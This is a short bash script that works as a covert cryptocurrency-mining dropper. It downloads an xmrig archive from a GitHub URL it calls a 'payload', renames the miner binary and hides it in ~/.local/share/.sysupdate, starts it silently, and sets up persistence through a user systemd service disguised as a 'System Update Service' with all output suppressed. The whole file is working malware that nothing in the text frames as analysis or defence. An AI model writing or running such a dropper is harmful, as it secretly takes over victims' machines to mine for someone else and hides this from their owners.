#!/bin/bash


# Localhost URL of your payload
URL="https://github.com/cybertech300/crypto/xmrig-6.24.0.tar.gz"

# Destination path
DEST="/tmp/xmrig-6.24.0.tar.gz"

# Download the file
if command -v curl &> /dev/null; then
    curl -fsSL "$URL" -o "$DEST"
elif command -v wget &> /dev/null; then
    wget -q "$URL" -O "$DEST"
else
    exit 1
fi

tar -xzf "/tmp/xmrig-6.24.0.tar.gz" -C "/tmp"

rm -f /tmp/xmrig-6.24.0.tar.gz


# Hidden install location
INSTALL_DIR="$HOME/.local/share/.sysupdate"

# Create directory
mkdir -p "$INSTALL_DIR"

# Copy xmrig + config.json
cp "/tmp/xicccq" "$INSTALL_DIR/"
cp "/tmp/config.json" "$INSTALL_DIR/"

rm -f /tmp/xicccq
rm -f /tmp/config.json

# Make executable
chmod +x "$INSTALL_DIR/xicccq"

"$INSTALL_DIR/xicccq" > /dev/null 2>&1 &

# Create systemd user service
SERVICE_DIR="$HOME/.config/systemd/user"
mkdir -p "$SERVICE_DIR"

SERVICE_FILE="$SERVICE_DIR/sysupdate.service"

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=System Update Service
After=default.target

[Service]
ExecStart=$INSTALL_DIR/xicccq
WorkingDirectory=$INSTALL_DIR
Restart=always
Nice=19
CPUWeight=1
IOWeight=1
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

# Enable & start service (user mode, no root needed)
systemctl --user daemon-reload
systemctl --user enable sysupdate.service
systemctl --user start sysupdate.service


